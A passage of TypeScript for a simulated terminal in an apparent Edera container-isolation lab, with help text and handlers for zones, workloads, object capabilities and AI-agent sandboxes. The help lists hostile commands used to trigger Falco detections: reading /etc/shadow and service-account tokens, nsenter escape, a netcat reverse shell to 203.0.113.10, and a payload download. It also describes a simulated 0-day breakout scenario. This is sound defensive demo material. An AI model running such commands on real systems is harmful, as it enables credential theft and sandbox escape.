            <code>kubectl label node &lt;node&gt; &lt;key&gt;=&lt;value&gt;</code>
            <span>Add or update a label on a simulated node.</span>
          </div>
 
          <div class="cli-help-command">
            <code>kubectl label pod &lt;pod&gt; &lt;key&gt;=&lt;value&gt;</code>
            <span>Add or update a label on a simulated pod.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl apply -f &lt;filename.yaml&gt;</code>
            <span>Apply one of the local Kubernetes manifests.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl delete -f &lt;filename.yaml&gt;</code>
            <span>Delete the resources represented by a local manifest.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl delete pod &lt;name&gt;</code>
            <span>Delete a pod from the simulated cluster.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl delete node &lt;name&gt;</code>
            <span>Remove a simulated node from the cluster.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl apply -f edera/nginx-deployment.yaml</code>
            <span>Create an Edera-backed Deployment with two replicas.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl delete -f edera/nginx-deployment.yaml</code>
            <span>Delete the Edera-backed Deployment and its managed pods.</span>
          </div>
        </div>

        <div class="cli-help-section">
          <div class="cli-help-section-title">Edera Runtime + Object Capabilities</div>

          <div class="cli-help-command">
            <code>kubectl get pods -n edera-runtime</code>
            <span>Inspect the Edera Runtime controller pod.</span>
          </div>

          <div class="cli-help-command">
            <code>protect zone list</code>
            <span>List Edera zones and the object capabilities they publish.</span>
          </div>
        </div>

        <div class="cli-help-section">
          <div class="cli-help-section-title">Object Capabilities</div>

          <div class="cli-help-command">
            <code>cat github.toml</code>
            <span>Read the GitHub capability manifest and its allow rules.</span>
          </div>

          <div class="cli-help-command">
            <code>protect zone launch --name ${OCAP_ZONE_NAME}</code>
            <span>Create the zone the agent will run in.</span>
          </div>

          <div class="cli-help-command">
            <code>${escapeHtml(OCAP_RELAY_LAUNCH_COMMAND)}</code>
            <span>Publish the GitHub capability from a relay workload in the zone.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload launch --zone ${OCAP_ZONE_NAME} --name ${OCAP_WORKLOAD_NAME} --ocap-consume ${OCAP_GITHUB_NAME} ${OCAP_WORKLOAD_IMAGE}</code>
            <span>Start the agent with the GitHub capability and nothing else.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec ${OCAP_WORKLOAD_NAME} -- env</code>
            <span>Verify the GitHub credential never enters the agent sandbox.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec ${OCAP_WORKLOAD_NAME} -- git clone https://github.com/kubernetes/kubernetes.git</code>
            <span>Exercise the GitHub capability with an explicitly allowed request.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec ${OCAP_WORKLOAD_NAME} -- git clone https://github.com/torvalds/linux.git</code>
            <span>Try a repository that was not granted by the capability.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec ${OCAP_WORKLOAD_NAME} -- curl https://example.com</code>
            <span>Try network access that no capability grants.</span>
          </div>

          <div class="cli-help-command">
            <code>${escapeHtml(README_WORKLOAD_LAUNCH_COMMAND)}</code>
            <span>Run the README fetcher as a provider that holds the token and publishes ${README_CAPABILITY}.</span>
          </div>

          <div class="cli-help-command">
            <code>protect object-capability dial ${README_CAPABILITY} ${README_DIAL_REPO}</code>
            <span>Dial the published capability to fetch an edera-dev README.</span>
          </div>
        </div>

        <div class="cli-help-section">
          <div class="cli-help-section-title">Capabilities, Templates and Sessions</div>

          <div class="cli-help-command">
            <code>${escapeHtml(CAPABILITY_SECRET_COMMAND)}</code>
            <span>Store the README provider's GitHub token in a Secret (already created in this lab).</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl apply -f examples/capability_provider.yaml</code>
            <span>Create the github CapabilityProvider; its provider pod publishes ${README_CAPABILITY}.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl apply -f examples/kubernetes_provider.yaml</code>
            <span>Add a kubernetes provider offering get-pods and get-pod-logs from one pod.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl get capabilityproviders</code>
            <span>List providers, their capabilities and provider pods.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl describe capabilityproviders.runtime.edera.dev</code>
            <span>Describe every provider and what it offers.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl describe po edera-capability-github</code>
            <span>Inspect the provider pod and its dev.edera/ocap-publish annotation.</span>
          </div>

          <div class="cli-help-command">
            <code>&lt;command&gt; | head -n &lt;N&gt;</code>
            <span>Show only the first N lines of a command's output.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl apply -f examples/sandbox_template.yaml</code>
            <span>Create a template granting a subset of a provider's capabilities.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl describe sandboxtemplate ${SANDBOX_TEMPLATE_NAME}</code>
            <span>See which provider and capabilities the template grants.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl apply -f examples/sandbox_session.yaml</code>
            <span>Start a session: a zone + workload consuming the provider's selected capabilities.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl apply -f examples/sandbox_session_denied.yaml</code>
            <span>Ask for a capability the template doesn't grant (rejected).</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl get sandboxtemplate,sandboxsession</code>
            <span>List templates and sessions (add ,pods to see session pods).</span>
          </div>

          <div class="cli-help-command">
            <code>python3 examples/session.py</code>
            <span>Run the SDK version, which creates and cleans up its own session.</span>
          </div>

          <div class="cli-help-command">
            <code>docker build -t ${README_IMAGE_PREFIX}&lt;language&gt;:1h &lt;language&gt;</code>
            <span>Build a readme-fetch image from rust/, python/ or typescript/.</span>
          </div>
        </div>

        <div class="cli-help-section">
          <div class="cli-help-section-title">AI Agent Sandbox</div>

          <div class="cli-help-command">
            <code>cat agent-sandbox/edera-sandbox.yaml</code>
            <span>Read the Edera Sandbox, Snapshot or Fork manifest.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl apply -f agent-sandbox/edera-sandbox.yaml</code>
            <span>Create the Sandbox, then the Snapshot and Fork the same way.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl wait --for=condition=Ready sandbox/sandbox-sample</code>
            <span>Wait for the Sandbox to run in its own Edera zone.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl get sandbox,snapshot,fork</code>
            <span>List the Edera Sandbox, Snapshot and Fork (add ,pods to see their pods).</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl exec -it sandbox-sample -- python3 -c "print(2+2)"</code>
            <span>Execute Python inside the sandbox runtime.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl exec sandbox-sample -- uname -r</code>
            <span>Verify the sandbox is using an Edera zone kernel.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl delete fork,snapshot,sandbox --all</code>
            <span>Remove the demo resources and their zones.</span>
          </div>
        </div>

        <div class="cli-help-section">
          <div class="cli-help-section-title">Edera</div>

          <div class="cli-help-command">
            <code>protect zone launch -n &lt;name&gt; [options]</code>
            <span>Create a new isolated Edera zone.</span>
          </div>

          <div class="cli-help-command">
            <code>protect zone list [ZONE] [--output json-pretty]</code>
            <span>List Edera zones, or inspect one zone with JSON output.</span>
          </div>

          <div class="cli-help-command">
            <code>protect zone watch</code>
            <span>Watch simulated zone state changes in real time.</span>
          </div>

          <div class="cli-help-command">
            <code>protect zone destroy [OPTIONS] &lt;ZONE&gt;</code>
            <span>Destroy an Edera zone by name or UUID.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload launch --zone &lt;zone&gt; --name &lt;name&gt; &lt;image&gt; [command]</code>
            <span>Start a workload inside an existing ready Edera zone.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload list [--selector status.state=running]</code>
            <span>List workloads and optionally filter them by state.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload stop &lt;workload&gt;</code>
            <span>Stop a running workload.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload start &lt;workload&gt;</code>
            <span>Start a stopped workload.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec &lt;workload&gt; &lt;command&gt;</code>
            <span>Execute a command inside a running workload.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload destroy &lt;workload&gt; --wait</code>
            <span>Remove a workload from its Edera zone.</span>
          </div>
        </div>

        <div class="cli-help-section">
          <div class="cli-help-section-title">Utilities</div>

          <div class="cli-help-command">
            <code>curl &lt;url&gt;</code>
            <span>Send a simulated HTTP GET request through the cluster.</span>
          </div>

          <div class="cli-help-command">
            <code>ls -laR [directory]</code>
            <span>Recursively list files and directories with permissions and hidden entries.</span>
          </div>

          <div class="cli-help-command">
            <code>tree -a [directory]</code>
            <span>Show a recursive branch-style directory tree, including hidden entries.</span>
          </div>

          <div class="cli-help-command">
            <code>find . -type f</code>
            <span>Recursively list files using paths relative to the starting directory.</span>
          </div>

          <div class="cli-help-command">
            <code>find . -ls</code>
            <span>Recursively list files with simulated detailed metadata.</span>
          </div>

          <div class="cli-help-command">
            <code>clear</code>
            <span>Clear the terminal output.</span>
          </div>

          <div class="cli-help-command">
            <code>history</code>
            <span>Show previously entered terminal commands.</span>
          </div>

          <div class="cli-help-command">
            <code>uname -r</code>
            <span>Show the simulated host kernel version; Edera workloads report their isolated zone kernel when executed inside the workload.</span>
          </div>

          <div class="cli-help-command">
            <code>sudo lspci -Dknn -d ::03xx</code>
            <span>Inspect simulated GPU PCI devices and their current driver binding.</span>
          </div>

          <div class="cli-help-command">
            <code>sudo cat /var/lib/edera/protect/daemon.toml</code>
            <span>Inspect the simulated Protect GPU and NVIDIA kernel-variant configuration.</span>
          </div>

          <div class="cli-help-command">
            <code>sudo protect image list-kernel-variants</code>
            <span>Verify that the NVIDIA kernel variant is resolvable.</span>
          </div>

          <div class="cli-help-command">
            <code>sudo systemctl restart protect-daemon</code>
            <span>Restart the simulated Protect daemon after configuration changes.</span>
          </div>

          <div class="cli-help-command">
            <code>sudo modprobe vfio_iommu_type1 && sudo modprobe vfio_pci</code>
            <span>Simulate loading VFIO modules for KVM GPU passthrough.</span>
          </div>

          <div class="cli-help-command">
            <code>sudo cat /etc/falco/config.d/falco-edera-config.yaml</code>
            <span>Inspect the simulated node-based Edera Falco plugin configuration.</span>
          </div>

          <div class="cli-help-command">
            <code>sudo cat /etc/falco/rules.d/falco-edera-rules.yaml</code>
            <span>Inspect simulated Edera Falco detection rules.</span>
          </div>

          <div class="cli-help-command">
            <code>sudo systemctl restart falco</code>
            <span>Restart the simulated Falco service with the Edera plugin.</span>
          </div>

          <div class="cli-help-command">
            <code>sudo falco -o "log_level=debug"</code>
            <span>Start the simulated node-based Falco stream and show accumulated Edera detections.</span>
          </div>

          <div class="cli-help-command">
            <code>helm upgrade falco falcosecurity/falco -n falco -f falco-edera-values.yaml</code>
            <span>Simulate upgrading a Helm-based Falco deployment with Edera configuration.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl get pods -n falco</code>
            <span>List simulated Falco pods.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl logs -n falco -l app.kubernetes.io/name=falco -f</code>
            <span>Stream accumulated simulated Falco logs from the Helm deployment.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec llm-app cat /proc/1/environ</code>
            <span>Trigger Edera Proc Environ Read (WARNING).</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec llm-app cat /etc/shadow</code>
            <span>Trigger Edera Sensitive File Read (WARNING).</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec llm-app nsenter -t 1 -m -u -i -n -p</code>
            <span>Trigger Edera Namespace Escape Attempt (CRITICAL).</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec llm-app nc 203.0.113.10 4444</code>
            <span>Trigger Edera Reverse Shell Tool (CRITICAL).</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec llm-app curl https://example.com/payload</code>
            <span>Trigger Edera Outbound Connection and Executable Download detections.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec llm-app /bin/sh -c "id"</code>
            <span>Trigger Edera Shell Command Execution (NOTICE); plain /bin/sh remains non-detecting.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec llm-app sudo id</code>
            <span>Trigger Edera Privilege Escalation Tool (WARNING).</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec llm-app cat /var/run/secrets/kubernetes.io/serviceaccount/token</code>
            <span>Trigger Edera Kubernetes Service Account Access (WARNING).</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec llm-app /bin/sh -c "echo demo &gt; /etc/demo.conf"</code>
            <span>Trigger Edera Sensitive File Write (WARNING).</span>
          </div>
        </div>

        <div class="cli-help-section">
          <div class="cli-help-section-title">ExploitGym breakout</div>

          <div class="cli-help-command">
            <code>kubectl get pods -n exploitgym agent proxy-control proxy-edera -o custom-columns=...</code>
            <span>Show the three scenario pods: the agent and the cache proxy running both with and without the edera runtimeClass.</span>
          </div>

          <div class="cli-help-command">
            <code>agent_to_hf</code>
            <span>Confirm the sandboxed agent has no internet; its only egress is the cache proxy.</span>
          </div>

          <div class="cli-help-command">
            <code>attack control</code>
            <span>Fire the poisoned-artifact deserialization 0-day at the shared-kernel proxy; the RCE escapes to the node.</span>
          </div>

          <div class="cli-help-command">
            <code>attack edera</code>
            <span>Fire the identical 0-day at the Edera-isolated proxy; the RCE still runs but is contained to its zone.</span>
          </div>

          <div class="cli-help-command">
            <code>falco_alerts host</code>
            <span>Query Falco's host source for the control-proxy escape detections.</span>
          </div>

          <div class="cli-help-command">
            <code>falco_alerts zone</code>
            <span>Query Falco's zone source and see the same edera-proxy activity attributed to, and confined within, its Edera zone.</span>
          </div>
        </div>

        <div class="cli-help-tip">
          Tip: use the Agent Sandbox + Edera guide below the terminal to walk through
          the runtime lifecycle step-by-step.
        </div>
      </div>
    `;
  };

  const WORKLOAD_LAUNCH_HELP = `Launch a new workload in a zone

Usage: protect workload launch [OPTIONS] --zone <ZONE> --name <NAME> <OCI> [COMMAND]...

Arguments:
  <OCI>
          Container image for the workload
  [COMMAND]...
          Command to run inside the workload

Options:
  -z, --zone <ZONE>
          Zone to launch the workload in, by name or UUID
  -n, --name <NAME>
          Name of the workload
  -m, --mounts <MOUNTS>
          Mount host directories into the workload, as src=HOST_PATH:dst=PATH[:ro=true] (repeatable)
      --ocap-consume <OCAP_CONSUME>
          Object capability to consume as NAME[=PROVIDER] (repeatable). NAME may be a capability type implemented by several providers; PROVIDER pins one implementation instead of taking the highest-priority one, e.g. 'dev.edera/bar=dev.edera/foo'
      --ocap-publish <OCAP_PUBLISH>
          Object capability to publish as NAME[=COMMAND ARGS] (repeatable). The command is split with shell word rules, so quote arguments containing spaces, e.g. 'dev.edera/x/fetch=/bin/holder fetch 1'
      --ocap-implements <OCAP_IMPLEMENTS>
          Capability types a published capability satisfies, as NAME=TYPE[,TYPE] (repeatable). NAME must match an --ocap-publish, e.g. 'dev.edera/foo=dev.edera/bar'
  -h, --help
          Print help`;

  const formatWorkloadLaunchHelpText = () =>
    `<span style="color:#dff7f0;">${escapeHtml(WORKLOAD_LAUNCH_HELP)}</span>`;

  const formatProtectHelpText = () => {
    return `
      <div class="cli-help">
        <div class="cli-help-header">
          <div class="cli-help-title">🛡️ Edera CLI</div>
          <div class="cli-help-version">Simulated Edera environment</div>
        </div>

        <div class="cli-help-description">
          Manage isolated zones and the workloads running inside them.
          Use <code style="color:#b8ff3c;">protect &lt;resource&gt; &lt;command&gt;</code>
          to work with a zone or workload.
        </div>

        <div class="cli-help-section">
          <div class="cli-help-section-title">Zones</div>

          <div class="cli-help-command">
            <code>protect zone launch -n &lt;name&gt; [options]</code>
            <span>Create a new isolated Edera zone.</span>
          </div>

          <div class="cli-help-command">
            <code>protect zone list [ZONE] [--output json-pretty]</code>
            <span>List Edera zones, or inspect one zone with JSON output.</span>
          </div>

          <div class="cli-help-command">
            <code>protect zone watch</code>
            <span>Watch simulated zone state changes in real time.</span>
          </div>

          <div class="cli-help-command">
            <code>protect zone destroy [OPTIONS] &lt;ZONE&gt;</code>
            <span>Destroy a zone by name or UUID.</span>
          </div>

          <div class="cli-help-command">
            <code>-W, --wait</code>
            <span>Wait for the destruction of the zone to complete.</span>
          </div>

          <div class="cli-help-command">
            <code>-A, --all</code>
            <span>Destroy all zones matching the input.</span>
          </div>

          <div class="cli-help-command">
            <code>-l, --selector &lt;SELECTOR&gt;</code>
            <span>Filter matches using the <code style="color:#b8ff3c;">status.state</code> field.</span>
          </div>

        </div>

        <div class="cli-help-section">
          <div class="cli-help-section-title">Workloads</div>

          <div class="cli-help-command">
            <code>protect workload launch --zone &lt;zone&gt; --name &lt;name&gt; &lt;image&gt; [command]</code>
            <span>Start a workload inside an existing ready zone.</span>
          </div>

          <div class="cli-help-command">
            <code>--ocap-consume / --ocap-publish / --ocap-implements</code>
            <span>Consume or publish object capabilities (capabilities are published by workloads, not zones). See <code style="color:#b8ff3c;">protect workload launch -h</code>.</span>
          </div>

          <div class="cli-help-command">
            <code>protect object-capability dial &lt;CAPABILITY&gt; [ARGS]...</code>
            <span>Call a capability published by a running workload with the given arguments.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload list [--selector status.state=running]</code>
            <span>List workloads and optionally filter them by state.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload stop &lt;workload&gt;</code>
            <span>Stop a running workload.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload start &lt;workload&gt;</code>
            <span>Start a stopped workload.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec &lt;workload&gt; &lt;command&gt;</code>
            <span>Execute a command inside a running workload.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload destroy &lt;workload&gt; --wait</code>
            <span>Remove a workload from its Edera zone.</span>
          </div>

          <div class="cli-help-command">
            <code>protect zone logs &lt;zone&gt;</code>
            <span>Show simulated zone boot and NVIDIA driver logs.</span>
          </div>

          <div class="cli-help-command">
            <code>protect image list [--output json-pretty]</code>
            <span>List cached container images.</span>
          </div>

          <div class="cli-help-command">
            <code>protect image pull [--overwrite-cache] &lt;image&gt;</code>
            <span>Pull an image into the local cache.</span>
          </div>

          <div class="cli-help-command">
            <code>protect image remove &lt;digest&gt;</code>
            <span>Remove a cached image by digest.</span>
          </div>

          <div class="cli-help-command">
            <code>protect image list-kernel-variants</code>
            <span>List configured zone kernel variants and their resolved images.</span>
          </div>
        </div>

        <div class="cli-help-section">
          <div class="cli-help-section-title">GPU passthrough</div>

          <div class="cli-help-command">
            <code>--device gpu0</code>
            <span>Attach the GPU named gpu0 in daemon.toml to a zone.</span>
          </div>

          <div class="cli-help-command">
            <code>--kernel-variant nvidia</code>
            <span>Launch the NVIDIA-enabled zone kernel variant.</span>
          </div>

          <div class="cli-help-command">
            <code>protect workload exec &lt;workload&gt; nvidia-smi</code>
            <span>Verify Tesla T4 access from inside a GPU workload.</span>
          </div>
        </div>

        <div class="cli-help-section">
          <div class="cli-help-section-title">Help</div>

          <div class="cli-help-command">
            <code>protect --help</code>
            <span>Show this command reference.</span>
          </div>

          <div class="cli-help-command">
            <code>protect -h</code>
            <span>Alias for <code style="color:#b8ff3c;">protect --help</code>.</span>
          </div>
        </div>

        <div class="cli-help-tip">
          Tip: use the Agent Sandbox + Edera guide below the terminal to walk through
          the runtime lifecycle step-by-step.
        </div>
      </div>
    `;
  };

  const parseProtectOutputFormat = (tokens: string[]): string => {
    const outputIndex = tokens.findIndex((token) => token === "-o" || token === "--output");
    if (outputIndex >= 0) return tokens[outputIndex + 1] || "table";
    const equalsToken = tokens.find((token) => token.startsWith("-o=") || token.startsWith("--output="));
    return equalsToken ? equalsToken.split("=").slice(1).join("=") : "table";
  };

  const renderProtectZoneJson = (zones: ProtectZone[], pretty = false) => {
    const payload = {
      zones: zones.map((zone) => ({
        name: zone.name,
        id: zone.uuid,
        state: zone.state,
        resources: { cpus: zone.targetCpus, memory: `${zone.maxCpus * 512}MB` },
        ipv4: zone.ipv4,
        ipv6: zone.ipv6,
        ...(zone.kernelVariant ? { kernelVariant: zone.kernelVariant } : {}),
      })),
    };
    printPre(escapeHtml(JSON.stringify(payload, null, pretty ? 2 : 0)));
  };

  const renderProtectWorkloadJson = (workloads: ProtectWorkload[], pretty = false) => {
    const payload = {
      workloads: workloads.map((workload) => ({
        name: workload.name,
        id: workload.uuid,
        zone: workload.zone,
        state: workload.state,
        image: workload.image,
        command: workload.command,
        ...(workload.ocapConsumed?.length ? { ocapConsume: workload.ocapConsumed } : {}),
        ...(workload.ocapPublished?.length
          ? {
              ocapPublish: workload.ocapPublished.map((capabilityName) =>
                workload.ocapPublishCommands?.[capabilityName]
                  ? `${capabilityName}=${workload.ocapPublishCommands[capabilityName].join(" ")}`
                  : capabilityName,
              ),
            }
          : {}),
        ...(workload.mounts?.length
          ? {
              mounts: workload.mounts.map((mount) => ({
                src: mount.source,
                dst: mount.destination,
                ro: mount.readOnly,
              })),
            }
          : {}),
      })),
    };
    printPre(escapeHtml(JSON.stringify(payload, null, pretty ? 2 : 0)));
  };

  const PROTECT_IMAGE_DIGESTS: Record<string, string> = {
    "nginx:latest": "sha256:demo01a7",
    "docker.io/library/alpine:latest": "sha256:demo02b4",
    "ubuntu:latest": "sha256:demo03c9",
  };

  const getProtectImageDigest = (reference: string, index: number): string =>
    PROTECT_IMAGE_DIGESTS[reference] ??
    `sha256:demo${String(index + 4).padStart(2, "0")}`;

  const renderProtectImageList = (pretty = false) => {
    const images = Array.from(cachedProtectImages).map((reference, index) => ({
      reference,
      digest: getProtectImageDigest(reference, index),
      format: "squashfs",
    }));
    if (pretty) {
      printPre(escapeHtml(JSON.stringify({ images }, null, 2)));
      return;
    }
    if (!images.length) {
      printHtml(`<span style="color:#a8cfca;">No cached images.</span>`);
      return;
    }

    // Size each column from the longest value actually being displayed so
    // shorter demo digests do not make the FORMAT column drift.
    const referenceWidth = Math.max(
      "REFERENCE".length,
      ...images.map((image) => image.reference.length),
    ) + 4;
    const digestWidth = Math.max(
      "DIGEST".length,
      ...images.map((image) => image.digest.length),
    ) + 4;
    const formatWidth = Math.max(
      "FORMAT".length,
      ...images.map((image) => image.format.length),
    );
    const tableWidth = referenceWidth + digestWidth + formatWidth;

    let output =
      `<span style="color:#00e5d4;font-weight:700;">` +
      `REFERENCE`.padEnd(referenceWidth) +
      `DIGEST`.padEnd(digestWidth) +
      `FORMAT` +
      `</span>\n`;
    output += `<span style="color:#08736d;">${"─".repeat(tableWidth)}</span>\n`;

    for (const image of images) {
      output +=
        escapeHtml(image.reference.padEnd(referenceWidth)) +
        escapeHtml(image.digest.padEnd(digestWidth)) +
        escapeHtml(image.format) +
        "\n";
    }

    printPre(output.trimEnd());
  };

  const getZoneByIdentifier = (identifier: string) =>
    protectZones.find((zone) => zone.name === identifier || zone.uuid === identifier);

  const renderZoneWatchSnapshot = () => {
    const lines = protectZones.map((zone) => `${zone.name}  ${zone.state}`);
    printPre(escapeHtml(lines.length ? lines.join("\n") : "No zones."));
  };

  const handleProtectCommand = async (
    rawCmd: string,
    tokens: string[],
  ): Promise<boolean> => {
    if (tokens[0] !== "protect") {
      return false;
    }

    if (
      tokens.length === 1 ||
      tokens[1] === "--help" ||
      tokens[1] === "-h"
    ) {
      printHtml(formatProtectHelpText());

      return true;
    }

    if (tokens[1] === "image") {
      if (tokens[2] === "list") {
        const output = parseProtectOutputFormat(tokens);
        renderProtectImageList(output === "json-pretty");
        return true;
      }

      if (tokens[2] === "pull") {
        let image = "";
        let overwrite = false;
        for (let i = 3; i < tokens.length; i++) {
          if (tokens[i] === "--overwrite-cache") overwrite = true;
          else if (!tokens[i].startsWith("-") && !image) image = tokens[i];
        }
        if (!image) {
          printHtml(`<span style="color:#ff7373;">Usage: protect image pull [--overwrite-cache] &lt;image&gt;</span>`);
          return true;
        }
        const existed = cachedProtectImages.has(image);
        cachedProtectImages.add(image);
        printHtml(`<span style="color:#b8ff3c;">${existed && !overwrite ? "Image already cached" : "Pulled image"}: ${escapeHtml(image)}</span>`);
        return true;
      }

      if (tokens[2] === "remove") {
        const image = tokens[3] || "";
        if (!image) {
          printHtml(`<span style="color:#ff7373;">Usage: protect image remove &lt;digest&gt;</span>`);
          return true;
        }
        const refs = Array.from(cachedProtectImages);
        const index = refs.findIndex(
          (ref, i) => image === ref || image === getProtectImageDigest(ref, i),
        );
        if (index < 0) {
          printHtml(`<span style="color:#ff7373;">Error: image digest "${escapeHtml(image)}" not found.</span>`);
          return true;
        }
        cachedProtectImages.delete(refs[index]);
        printHtml(`<span style="color:#b8ff3c;">Removed image ${escapeHtml(image)}.</span>`);
        return true;
      }

      if (tokens[2] === "list-kernel-variants") {
        printPre(
          `<span style="color:#dff7f0;">nvidia    ${escapeHtml(
            NVIDIA_KERNEL_VARIANT,
          )}    resolvable</span>`,
        );

        addEvent(
          "Normal",
          "KernelVariantResolved",
          "image/nvidia",
          "NVIDIA kernel variant is resolvable",
        );

        markDemoStepComplete("gpu-kernel-variant");
        return true;
      }

      printHtml(
        `<span style="color:#ff7373;">Unknown protect image command: ${escapeHtml(
          tokens.slice(2).join(" "),
        )}</span>`,
      );
      return true;
    }

    if (tokens[1] === "zone") {
      const subcommand = tokens[2];

      if (subcommand === "logs") {
        const zoneIdentifier = tokens[3];

        const zone = protectZones.find(
          (item) =>
            item.name === zoneIdentifier ||
            item.uuid === zoneIdentifier,
        );

        if (!zone) {
          printHtml(
            `<span style="color:#ff7373;">Error: zone "${escapeHtml(
              zoneIdentifier || "",
            )}" not found.</span>`,
          );
          return true;
        }

        if (zone.name !== "zone-gpu" || zone.kernelVariant !== "nvidia") {
          printHtml(
            `<span style="color:#a8cfca;">No NVIDIA driver logs are available for zone "${escapeHtml(
              zone.name,
            )}".</span>`,
          );
          return true;
        }

        printPre(
          `<span style="color:#dff7f0;">${escapeHtml(
            NVIDIA_ZONE_LOGS,
          )}</span>`,
        );

        addEvent(
          "Normal",
          "NvidiaDriverVerified",
          `zone/${zone.name}`,
          "NVIDIA driver initialized successfully",
        );

        markDemoStepComplete("gpu-zone-logs");
        return true;
      }

      if (subcommand === "watch") {
        printHtml(`<span style="color:#00e5d4;font-weight:700;">Watching Edera zones (simulated live updates).</span>`);
        renderZoneWatchSnapshot();
        let ticks = 0;
        const watchTimer = window.setInterval(() => {
          ticks += 1;
          renderZoneWatchSnapshot();
          if (ticks >= 6) {
            window.clearInterval(watchTimer);
            printHtml(`<span style="color:#a8cfca;">Zone watch ended after 6 updates.</span>`);
          }
        }, 1000);
        return true;
      }

      if (subcommand === "list") {
        let identifier = "";
        let selector = "";
        for (let i = 3; i < tokens.length; i++) {
          if (tokens[i] === "--selector" || tokens[i] === "-l") selector = tokens[++i] || "";
          else if (tokens[i].startsWith("--selector=")) selector = tokens[i].slice(11);
          else if (!tokens[i].startsWith("-") && !identifier) identifier = tokens[i];
        }
        let zones = identifier ? protectZones.filter((zone) => zone.name === identifier || zone.uuid === identifier) : [...protectZones];
        if (selector) {
          const normalized = normalizeZoneSelector(selector);
          if (!normalized) {
            printHtml(`<span style="color:#ff7373;">Invalid selector "${escapeHtml(selector)}".</span>`);
            return true;
          }
          const state = normalized === "created" ? "ready" : normalized;
          zones = zones.filter((zone) => zone.state === state);
        }
        const output = parseProtectOutputFormat(tokens);
        if (output === "json" || output === "json-pretty") {
          renderProtectZoneJson(zones, output === "json-pretty");
        } else if (output === "jsonl") {
          printPre(zones.map((zone) => escapeHtml(JSON.stringify({ name: zone.name, id: zone.uuid, state: zone.state }))).join("\n"));
        } else {
          renderProtectZoneList(zones);
        }

        const hasDestroyedZone = protectZones.some(
          (zone) => zone.state === "destroyed",
        );

        markDemoStepComplete(
          hasDestroyedZone ? "final-list" : "zone-list",
        );

        if (activeDemoMode === "agent-sandbox") {
          // Track the guide's zone by name so unrelated zones (e.g. Sandbox
          // pods) don't advance the object capability steps.
          const testZone = protectZones.find(
            (zone) => zone.name === OCAP_ZONE_NAME,
          );
          if (!testZone) {
            markDemoStepComplete("protect-zone-list-initial");
          } else if (testZone.state === "ready") {
            markDemoStepComplete("protect-zone-list-ready");
          } else if (testZone.state === "destroyed") {
            markDemoStepComplete("protect-zone-list-final");
          }
        }

        if (protectZones.some((zone) => zone.name === "zone-gpu")) {
          markDemoStepComplete("gpu-zone-list");
        }

        return true;
      }

      if (subcommand === "launch") {
        let name = "";
        let minCpus = 1;
        let maxCpus = 2;
        let targetCpus = 2;
        let device = "";
        let kernelVariant = "";

        for (let i = 3; i < tokens.length; i++) {
          const token = tokens[i];

          if (token === "--ocap-publish" || token.startsWith("--ocap-publish=")) {
            // Capabilities are published by workloads, not zones.
            printPre(
              `<span style="color:#ff7373;">error: unexpected argument '--ocap-publish' found</span>\n\n` +
                `<span style="color:#dff7f0;">Usage: protect zone launch [OPTIONS] --name &lt;NAME&gt;\n\nFor more information, try '--help'.</span>`,
            );
            printHtml(
              `<span style="color:#a8cfca;"># --ocap-publish is a workload flag: protect workload launch --zone &lt;zone&gt; --name &lt;name&gt; --ocap-publish NAME[=COMMAND ARGS] &lt;image&gt;</span>`,
            );
            return true;
          } else if (token === "-W" || token === "--wait") {
            // Launch completes synchronously in the simulator.
          } else if (token === "-n" || token === "--name") {
            name = tokens[++i] || "";
          } else if (token.startsWith("--name=")) {
            name = token.split("=")[1] || "";
          } else if (token === "--min-cpus") {
            minCpus = Number(tokens[++i]) || 1;
          } else if (token.startsWith("--min-cpus=")) {
            minCpus = Number(token.split("=")[1]) || 1;
          } else if (token === "-C") {
            maxCpus = Number(tokens[++i]) || 2;
          } else if (token === "-c") {
            targetCpus = Number(tokens[++i]) || 2;
          } else if (token === "--device") {
            device = tokens[++i] || "";
          } else if (token.startsWith("--device=")) {
            device = token.slice("--device=".length);
          } else if (token === "--kernel-variant") {
